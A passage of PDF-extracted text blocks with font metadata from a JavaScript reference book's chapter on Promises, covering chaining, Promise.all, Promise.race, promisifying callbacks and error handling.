        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 264",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "promise. then ( value  =>   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Work has completed successfully,      // promise has been fulfilled with \"value\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "}) . catch ( reason  =>   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Something went wrong,      // promise has been rejected with \"reason\" });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note:  Calling  promise. then ( ... )  and  promise. catch ( ... )  on the same promise might result in an  Uncaught exception  in  Promise  if an error occurs, either while executing the promise or inside one of the callbacks, so the preferred way would be to attach the next listener on the promise returned by the previous  then  /  catch . Alternatively, both callbacks can be attached in a single call to  then :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "promise. then ( onFulfilled ,  onRejected );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Attaching callbacks to a promise that has already been settled will immediately place them in the  microtask queue , and they will be invoked \"as soon as possible\" (i.e. immediately after the currently executing script). It is not necessary to check the state of the promise before attaching callbacks, unlike with many other event-emitting implementations. Live demo",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 42.2: Promise chaining",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  then  method of a promise returns a new promise.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  promise  =   new  Promise ( resolve  =>  setTimeout ( resolve ,   5000 )); promise",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // 5 seconds later",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    . then (()   =>   2 )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // returning a value from a then callback will cause      // the new promise to resolve with this value",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    . then ( value  =>   {   /* value === 2 */   });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Returning a  Promise  from a  then  callback will append it to the promise chain.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  wait ( millis )   {      return   new  Promise ( resolve  =>  setTimeout ( resolve ,  millis )); } const  p  =  wait ( 5000 ) . then (()   =>  wait ( 4000 )) . then (()   =>  wait ( 1000 ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "p. then (()   =>   {   /* 10 seconds have passed */   });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A  catch  allows a rejected promise to recover, similar to how  catch  in a  try / catch  statement works. Any chained then  after a  catch  will execute its resolve handler using the value resolved from the  catch .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  p  =   new  Promise ( resolve  =>   { throw   'oh no' }); p. catch (()   =>   'oh yes' ) . then ( console. log . bind ( console ));    // outputs \"oh yes\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If there are no  catch  or  reject  handlers in the middle of the chain, a  catch  at the end will capture any rejection in the chain:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "p. catch (()   =>  Promise. reject ( 'oh yes' ))   . then ( console. log . bind ( console ))        // won't be called",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 265",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  . catch ( console. error . bind ( console ));    // outputs \"oh yes\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "On certain occasions, you may want to \"branch\" the execution of the functions. You can do it by returning di\ufb00erent promises from a function depending on the condition. Later in the code, you can merge all of these branches into one to call other functions on them and/or to handle all errors in one place.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "promise     . then ( result  =>   {                     if   ( result. condition )   {              return  handlerFn1 ()                 . then ( handlerFn2 );          }   else   if   ( result. condition2 )   {              return  handlerFn3 ()                 . then ( handlerFn4 );          }   else   {              throw   new  Error ( \"Invalid result\" );          }      })     . then ( handlerFn5 )     . catch ( err  =>   {         console. error ( err );      });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Thus, the execution order of the functions looks like:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "promise  -->  handlerFn1  ->  handlerFn2  -->  handlerFn5 ~~ >  . catch ()           |                              ^          V                             |           ->  handlerFn3  ->  handlerFn4  -^             ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The single  catch  will get the error on whichever branch it may occur.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 42.3: Waiting for multiple concurrent promises",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  Promise. all ()  static method accepts an iterable (e.g. an  Array ) of promises and returns a new promise, which resolves when  all  promises in the iterable have resolved, or rejects if  at least one  of the promises in the iterable have rejected.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// wait \"millis\" ms, then resolve with \"value\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  resolve ( value ,  milliseconds )   {      return   new  Promise ( resolve  =>  setTimeout (()   =>  resolve ( value ),  milliseconds )); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// wait \"millis\" ms, then reject with \"reason\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  reject ( reason ,  milliseconds )   {      return   new  Promise (( _ ,  reject )   =>  setTimeout (()   =>  reject ( reason ),  milliseconds )); } Promise. all ([     resolve ( 1 ,   5000 ),     resolve ( 2 ,   6000 ),     resolve ( 3 ,   7000 )      ]) . then ( values  =>  console. log ( values ));   // outputs \"[1, 2, 3]\" after 7 seconds. Promise. all ([     resolve ( 1 ,   5000 ),     reject ( 'Error!' ,   6000 ),     resolve ( 2 ,   7000 ) ]) . then ( values  =>  console. log ( values ))   // does not output anything",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 266",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": ". catch ( reason  =>  console. log ( reason ));   // outputs \"Error!\" after 6 seconds.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Non-promise values in the iterable are \"promisi\ufb01ed\".",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Promise. all ([     resolve ( 1 ,   5000 ),     resolve ( 2 ,   6000 ),      {  hello :   3   } ])",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": ". then ( values  =>  console. log ( values ));   // outputs \"[1, 2, { hello: 3 }]\" after 6 seconds",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Destructuring assignment can help to retrieve results from multiple promises.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Promise. all ([     resolve ( 1 ,   5000 ),     resolve ( 2 ,   6000 ),     resolve ( 3 ,   7000 ) ]) . then (([ result1 ,  result2 ,  result3 ])   =>   {     console. log ( result1 );     console. log ( result2 );     console. log ( result3 ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 42.4: Reduce an array to chained promises",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "This design pattern is useful for generating a sequence of asynchronous actions from a list of elements. There are two variants : the \"then\" reduction, which builds a chain that continues as long as the chain experiences success. the \"catch\" reduction, which builds a chain that continues as long as the chain experiences error.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The \"then\" reduction",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "This variant of the pattern builds a  . then ()  chain, and might be used for chaining animations, or making a sequence of dependent HTTP requests.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 1 ,   3 ,   5 ,   7 ,   9 ] . reduce (( seq ,  n )   =>   {      return  seq. then (()   =>   {         console. log ( n );          return   new  Promise ( res  =>  setTimeout ( res ,   1000 ));      }); },  Promise. resolve ()) . then (      ()   =>  console. log ( 'done' ),      ( e )   =>  console. log ( e ) );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// will log 1, 3, 5, 7, 9, 'done' in 1s intervals",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Explanation: We call  . reduce ()  on a source array, and provide  Promise. resolve ()  as an initial value. 1. Every element reduced will add a  . then ()  to the initial value. 2. reduce () 's product will be Promise.resolve().then(...).then(...). 3. We manually append a  . then ( successHandler ,  errorHandler )  after the reduce, to execute  successHandler 4. once all the previous steps have resolved. If any step was to fail, then  errorHandler  would execute.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 267",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Note: The \"then\" reduction is a sequential counterpart of  Promise. all () .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The \"catch\" reduction",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "This variant of the pattern builds a  . catch ()  chain and might be used for sequentially probing a set of web servers for some mirrored resource until a working server is found.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  working_resource  =   5 ;   // one of the values from the source array",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "[ 1 ,   3 ,   5 ,   7 ,   9 ] . reduce (( seq ,  n )   =>   {      return  seq. catch (()   =>   {         console. log ( n );          if ( n  ===  working_resource )   {   // 5 is working              return   new  Promise (( resolve ,  reject )   =>  setTimeout (()   =>  resolve ( n ),   1000 ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         }   else   {   // all other values are not working",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "             return   new  Promise (( resolve ,  reject )   =>  setTimeout ( reject ,   1000 ));          }      }); },  Promise. reject ()) . then (      ( n )   =>  console. log ( 'success at: '   +  n ),      ()   =>  console. log ( 'total failure' ) );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// will log 1, 3, 5, 'success at 5' at 1s intervals",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Explanation: We call  . reduce ()  on a source array, and provide  Promise. reject ()  as an initial value. 1. Every element reduced will add a  . catch ()  to the initial value. 2.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "reduce () 's product will be  Promise. reject () . catch ( ... ) . catch ( ... ) . 3.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "We manually append  . then ( successHandler ,  errorHandler )  after the reduce, to execute  successHandler 4. once any of the previous steps has resolved. If all steps were to fail, then  errorHandler  would execute. Note: The \"catch\" reduction is a sequential counterpart of  Promise. any ()  (as implemented in  bluebird. js , but not currently in native ECMAScript).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 42.5: Waiting for the \ufb01rst of multiple concurrent promises",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  Promise. race ()  static method accepts an iterable of Promises and returns a new Promise which resolves or rejects as soon as the  \ufb01rst  of the promises in the iterable has resolved or rejected.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// wait \"milliseconds\" milliseconds, then resolve with \"value\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  resolve ( value ,  milliseconds )   {      return   new  Promise ( resolve  =>  setTimeout (()   =>  resolve ( value ),  milliseconds )); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// wait \"milliseconds\" milliseconds, then reject with \"reason\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  reject ( reason ,  milliseconds )   {      return   new  Promise (( _ ,  reject )   =>  setTimeout (()   =>  reject ( reason ),  milliseconds )); } Promise. race ([     resolve ( 1 ,   5000 ),     resolve ( 2 ,   3000 ),     resolve ( 3 ,   1000 ) ]) . then ( value  =>  console. log ( value ));   // outputs \"3\" after 1 second.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 268",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Promise. race ([     reject ( new  Error ( 'bad things!' ),   1000 ),     resolve ( 2 ,   2000 ) ]) . then ( value  =>  console. log ( value ))   // does not output anything . catch ( error  =>  console. log ( error. message ));   // outputs \"bad things!\" after 1 second",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 42.6: \"Promisifying\" functions with callbacks",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Given a function that accepts a Node-style callback,",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "fooFn ( options ,   function  callback ( err ,  result )   {  ...  });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "you can promisify it  (convert it to a promise-based function)  like this:",
        "font_name": "OpenSans-Italic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  promiseFooFn ( options )   {      return   new  Promise (( resolve ,  reject )   =>         fooFn ( options ,   ( err ,  result )   =>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "             // If there's an error, reject; otherwise resolve",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "            err  ?  reject ( err )   :  resolve ( result )          )      ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This function can then be used as follows:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "promiseFooFn ( options ) . then ( result  =>   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // success!",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "}) . catch ( err  =>   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // error! });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In a more generic way, here's how to promisify any given callback-style function:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  promisify ( func )   {      return   function ( ... args )   {          return   new  Promise (( resolve ,  reject )   =>   {             func ( ... args ,   ( err ,  result )   =>  err  ?  reject ( err )   :  resolve ( result ));          });      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This can be used like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  fs  =  require ( 'fs' ); const  promisedStat  =  promisify ( fs. stat . bind ( fs )); promisedStat ( '/foo/bar' )     . then ( stat  =>  console. log ( 'STATE' ,  stat ))     . catch ( err  =>  console. log ( 'ERROR' ,  err ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 42.7: Error Handling",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Errors thrown from promises are handled by the second parameter ( reject ) passed to  then  or by the handler passed to  catch :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "throwErrorAsync ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 269",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  . then ( null ,  error  =>   {   /* handle error here */   });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// or",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "throwErrorAsync ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  . catch ( error  =>   {   /* handle error here */   });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Chaining",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "If you have a promise chain then an error will cause  resolve  handlers to be skipped:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "throwErrorAsync ()   . then (()   =>   {   /* never called */   })",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  . catch ( error  =>   {   /* handle error here */   });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The same applies to your  then  functions. If a  resolve  handler throws an exception then the next  reject  handler will be invoked:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "doSomethingAsync ()   . then ( result  =>   {  throwErrorSync ();   })   . then (()   =>   {   /* never called */   })",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  . catch ( error  =>   {   /* handle error from throwErrorSync() */   });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "An error handler returns a new promise, allowing you to continue a promise chain. The promise returned by the error handler is resolved with the value returned by the handler:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "throwErrorAsync ()   . catch ( error  =>   {   /* handle error here */ ;   return  result ;   })   . then ( result  =>   {   /* handle result here */   });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can let an error cascade down a promise chain by re-throwing the error:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "throwErrorAsync ()   . catch ( error  =>   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       /* handle error from throwErrorAsync() */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       throw  error ;    })",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  . then (()   =>   {   /* will not be called if there's an error */   })   . catch ( error  =>   {   /* will get called with the same error */   });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It is possible to throw an exception that is not handled by the promise by wrapping the  throw  statement inside a",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "setTimeout  callback: new  Promise (( resolve ,  reject )   =>   {   setTimeout (()   =>   {   throw   new  Error ();   }); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This works because promises cannot handle exceptions thrown asynchronously.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Unhandled rejections",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "An error will be silently ignored if a promise doesn't have a  catch  block or  reject  handler:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "throwErrorAsync ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  . then (()   =>   {   /* will not be called */   }); // error silently ignored",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To prevent this, always use a  catch  block:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 270",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "throwErrorAsync ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  . then (()   =>   {   /* will not be called */   })",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  . catch ( error  =>   {   /* handle error*/   });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// or",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "throwErrorAsync ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  . then (()   =>   {   /* will not be called */   },  error  =>   {   /* handle error*/   });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Alternatively, subscribe to the  unhandledrejection  event to catch any unhandled rejected promises:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "window. addEventListener ( 'unhandledrejection' ,  event  =>   {});",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Some promises can handle their rejection later than their creation time. The  rejectionhandled  event gets \ufb01red whenever such a promise is handled:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "window. addEventListener ( 'unhandledrejection' ,  event  =>  console. log ( 'unhandled' )); window. addEventListener ( 'rejectionhandled' ,  event  =>  console. log ( 'handled' )); var  p  =  Promise. reject ( 'test' ); setTimeout (()   =>  p. catch ( console. log ),   1000 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Will print 'unhandled', and after one second 'test' and 'handled'",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  event  argument contains information about the rejection.  event. reason  is the error object and  event. promise is the promise object that caused the event.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "In Nodejs the  rejectionhandled  and  unhandledrejection  events are called  rejectionHandled  and",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "unhandledRejection  on  process , respectively, and have a di\ufb00erent signature:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "process. on ( 'rejectionHandled' ,   ( reason ,  promise )   =>   {}); process. on ( 'unhandledRejection' ,   ( reason ,  promise )   =>   {});",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  reason  argument is the error object and the  promise  argument is a reference to the promise object that caused the event to \ufb01re. Usage of these  unhandledrejection  and  rejectionhandled  events should be considered for debugging purposes only. Typically, all promises should handle their rejections. Note:  Currently, only Chrome 49+ and Node.js support  unhandledrejection  and  rejectionhandled  events.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Caveats Chaining with  fulfill  and  reject",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The  then ( fulfill ,  reject )  function (with both parameters not  null ) has unique and complex behavior, and shouldn't be used unless you know exactly how it works. The function works as expected if given  null  for one of the inputs:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// the following calls are equivalent",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "promise. then ( fulfill ,   null ) promise. then ( fulfill )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// the following calls are also equivalent",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "promise. then ( null ,  reject ) promise. catch ( reject )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "However, it adopts unique behavior when both inputs are given:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 271",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// the following calls are not equivalent!",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "promise. then ( fulfill ,  reject ) promise. then ( fulfill ) . catch ( reject )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// the following calls are not equivalent!",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "promise. then ( fulfill ,  reject ) promise. catch ( reject ) . then ( fulfill )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  then ( fulfill ,  reject )  function looks like it is a shortcut for  then ( fulfill ) . catch ( reject ) , but it is not, and will cause problems if used interchangeably. One such problem is that the  reject  handler does not handle errors from the  fulfill  handler. Here is what will happen:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Promise. resolve ()   // previous promise is fulfilled",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    . then (()   =>   {   throw   new  Error ();   },   // error in the fulfill handler",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        error  =>   {   /* this is not called! */   });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The above code will result in a rejected promise because the error is propagated. Compare it to the following code, which results in a ful\ufb01lled promise:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Promise. resolve ()   // previous promise is fulfilled",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    . then (()   =>   {   throw   new  Error ();   })   // error in the fulfill handler     . catch ( error  =>   {   /* handle error */   });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A similar problem exists when using  then ( fulfill ,  reject )  interchangeably with  catch ( reject ) . then ( fulfill ) , except with propagating ful\ufb01lled promises instead of rejected promises.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Synchronously throwing from function that should return a promise",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Imagine a function like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo ( arg )   {    if   ( arg  ===   'unexepectedValue' )   {      throw   new  Error ( 'UnexpectedValue' )    }    return   new  Promise ( resolve  =>     setTimeout (()   =>  resolve ( arg ),   1000 )    ) }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If such function is used in the  middle  of a promise chain, then apparently there is no problem:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "makeSomethingAsync () .   . then (()   =>  foo ( 'unexpectedValue' ))",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  . catch ( err  =>  console. log ( err ))   // <-- Error: UnexpectedValue will be caught here",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "However, if the same function is called outside of a promise chain, then the error will not be handled by it and will be thrown to the application:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "foo ( 'unexpectedValue' )   // <-- error will be thrown, so the application will crash",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  . then ( makeSomethingAsync )   // <-- will not run   . catch ( err  =>  console. log ( err ))   // <-- will not catch",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "There are 2 possible workarounds:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Return a rejected promise with the error",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 272",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Instead of throwing, do as follows:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo ( arg )   {    if   ( arg  ===   'unexepectedValue' )   {      return  Promise. reject ( new  Error ( 'UnexpectedValue' ))    }    return   new  Promise ( resolve  =>     setTimeout (()   =>  resolve ( arg ),   1000 )    ) }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Wrap your function into a promise chain",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Your  throw  statement will be properly caught when it is already inside a promise chain:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
